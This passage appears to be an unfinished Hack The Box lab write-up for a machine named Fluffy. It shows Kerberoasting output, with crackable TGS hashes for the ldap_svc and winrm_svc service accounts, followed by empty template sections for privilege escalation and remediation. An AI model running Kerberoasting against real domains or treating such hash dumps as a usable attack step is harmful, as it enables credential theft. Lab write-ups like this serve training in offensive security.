d9b6bcecfec0c724cba8335c4ac7b6fe337bd64feb3ec4c9c23921f6654d3550d8e9fc1ac8cc7d37d2c038c3104d26f8dd22566525f5216d2674face918917a8de3fa9a60c4ad1086ecf1cc6dda0edbe5b9269b0aa48163acaa6748b268cebfae598faa8728acfa438e84af1305b2d2fe156a6ccac89a0d81eaec464cb82d93ff072b775c0f12c3b915f9b3654382ede011ce7ea5584024015da9ac3b999514cacf7a1083f7d14b5784d60e9824cb4b2cd2f88c4af0e6b781b947bd48348b90b3ff07b815cccbcb974e30ef25ef3a2def45b0feb23b
[+] Printing hash for (ldap_svc)
$krb5tgs$23$*ldap_svc$FLUFFY.HTB$fluffy.htb/ldap_svc*$83ba340e2ac85677532f114b002233aa$bedc121be7e052d065f01857aab8f20f602f591962a3edd8db812a2f8a31d5f37993068e3a7c1db66915ab810f3ac907079da9d76adf607b88414cdc8e5e1911f66d339e7948fb03e9d50ff53bc4322f2ad23c3f7c92d9e072d959cc45d44856647b1bc2a5e6f9564cd3296742e66d3e1af130c7e76fa9468a0148cd14762cfd5c194d135584f6c4bfd35f6a97110526bda43fc406f229e6bb60398e6c2b0811cbd1b64dccff3c9045ebc451c1ea2694260a03f8526f5181dcb632e710a1c74d509c1c81e26fcc1d09f8c991138a3828d1a67eec751d6a1fa6c6b89cd9ddbfe89c212616e48697fc21f569fa5914e5a4073cdb19a5edacf076fca070155f7bbca0799629d1bf61e4e0d6fd51f3f8df409280053488f8b0e9f6285c2351822edee4979138fa4fc92828fab2cffaa5b31d9bdf66f2f6d9308165af1fd511f7df776496fd476afb5955d6888e336ef4a1078a5430e310d4403a336eee4ef9102851ceab6ae87ff061811540c9474389bcfebcd45869269ff83fa7f74d500e120b290a94b0066989c35eeed7bb0a2bc3951bff09512ed49e268fa296e65bffe91edd1d6802155cd6b1ce5bfb2eefa4c242ab9f4112e7bcb72c9769a1892278f617d6365d68fdff28eb77ef05f7d252c3db971759ea18cf8c838883021400ff1d7eb23e9c06667b72be80205d66c4d5c5398a32ec1dc387d6b3c18ee64394de4c3145b6b051600c3544fe67c6e736fb83e4073ef7a49e92284e342c8b37c45c0e9f19ee837a1edcfb341e229664484e9df0e73635b3311c8deea30cfa30abd686a53e9bdf56bbc0a041a0fe1bc8aa120f0033ecd5bd81c8dd0d43e5f7a49bcc474380b01a6b6aaff86989f04c8b744495ac27cd6ea338b19344493cf168c3a525745ab43d743309ef08eeb4b4c4989c094692d77bddf7fe8214bee0d2091426fb1eec42461e31cfd0fb3ed9ce2c0671b7e0b9f5feab42d523e3678cd37460998e4ebc53e85204aecd249069ef312717f34010a29e6abfbedd6d5717d1e6a98920e8da4a769659737f3cb551eaffe217e1a4ad53655da937e39e82594874b1c6b3749c309e96561f0bdf602284b7cee82d1a4759d5af2cfef091e6a3e12bb5eb3efe03041087a4b7db62d7340a3b39846f542e0e55ba49f277acc87f97b0e18ad7d7ab11a846f3857bc52bb2ec08fd607a45a31244debd5a0721b74562599cf85b081f5928f18a48c04793c113b09023349ed262c98bb4ddbf87c0285ea8934026f50844c5517a94d36a654e0edf4192f51e485771f47a3bee90faa2e4b1094259818053654a38d6c74962fb20dd79e39f12445832d0700798e1b348b4cc4c4aec4b146495f379b838263d9438dcea19d274a6885568e99a7c06d6dacec59ecfe321e7c9dd2684a4808fdd59e608149adeafa40fe10744640637e1d9084a1c1cc3a1d91cbd4a6d7392dc5d6977b0fe270bc1d248d2a307aeaff941852080ec662c0273f1ce
[+] Printing hash for (winrm_svc)
$krb5tgs$23$*winrm_svc$FLUFFY.HTB$fluffy.htb/winrm_svc*$2ad86ce6ee4f618365f0f473d5029a5f$bc686bb6ad21162e332ae5430d2211a1c611e4153ccbba6750696a63d706e96e9434f8a4f4d0d3b246bd0962ad048748815a75c35173cbb0b2e694b2af7b2deb7aebe7eaa61c62b3e3405e08e9853d7263223856ec2bbf8fb50642b25229b086971a2335a37c0cb1c514fd65f391c15eabd6f0dea631a3fe55b81bd9953912c770c5e7c99ba6fd5274c0767321671d8f19d00cf4e3d1fec7e8d8989bfb1c4f0cd4853989d1caac147e63c29f1caf36593b8e32e34975c518cd4218f09aabc547b306d2cac9dcec9293625ea1620c7741bb5ca665821c5194b2918276dfeb97fa2686243bad69cd1eebe33f8add62079ffc09a197b153a04ee7c504b43e7eb13355f363145178327aef30e466e761b8811fb7b1bd05923d57860d2af1149a01bcd544da67738779860ec0c7836f64b0c1a11518621d1dae1468c122f345aa0688745737b5f399011eb56958b986f87dd8fc0195605351d77770508fdcac59e5b2923de84d668cee434b89b518fb9234b55437638fc6849c946bec77f6373d8805f44f49b2ee685dac0a310a044ce13302153541ff0bf2398fee57d3278a436f87fc4f0eaf2bc6c0081e30076d6043a928fdd667f421d462e76145c1fb11372a99febb2c4a972f08b1892d1287f7b7156b1edd2f7aa2a394211a7fda2b1fe1d1d3fe2b6b4236ffa63d0485939dda1f155ab8712c6fe40a6b9d3791795eec28f45b5b48db7392a979017f3abe695f317c39d9b89cc487f5cb8478ea8a6f3ebb230b205d9c8bea8ade33e2520e5bf69b0b525583f55d27ff1e7e50bac135222989f13d7f9c816ee82b0b489209d6d372cf41f71de06f343ba165badaa911ab92b3362d7b86483f13d5e1926e3629ab520dfbe9e92e29e0f7a4cb0cad02c68df95d6065dea33691a8ca0c9bae5f1f46b1a13a804a0c65a806e7641264ad95938da664487e3b65d8dd207411421ca4a243b4205b9215a4673a71f820bace78441deeb0a6d7101fdd0d8b189f4cf9a642d07182d0fcabe11a5159d4ccc67d9a55cd7c08b859efbf984878b550f2440b88bcb9d5b8fe09b119dac4cc4758d793f20dfca2cd69116c6cba707e2117c7036e7738e177355b58de63a50331d6c839d895388997fb97e64bc828ed9b7e6169d97de70817fc902730c1144a7807eaef5229e6dd9caffc362f06ad2101cc4f6da2b26b4a5cdd72ec8d74d5647378b8f043bc30ca8cd5c8c1054301e53499a47725c6aedd40bf3b3ae650e831a16b5a1ec15937b58bd4fe1e9e771ab2df8acc3376877411ae44ea2105d57d956e413efc4db13aa31f25fc5664a3ed656be6e1a9fa8e0e3b2bc5576568ae3b76d638af3475150433e35fee5fbcc1334af073044c570f3f47f67d4713b650bccabba9b7d48d35c452635d615f55c7fb3cb049497ff2b3ba774fb5d39c3bf47d9455c0acf439a5e53c75324326429937097a2a07e0bc892c00f0bde9d3f63025dabb530982a3b3293d049c

```

---
## Privilege Escalation

### Enumeration

What you found that leads to root/admin.

### Exploitation

Step-by-step privilege escalation.

```shell
# Commands used
```

---
## Remediation

- Key takeaway 1
- Key takeaway 2
- Key takeaway 3

---
## References

- [Reference 1](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)
- [Reference 2](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)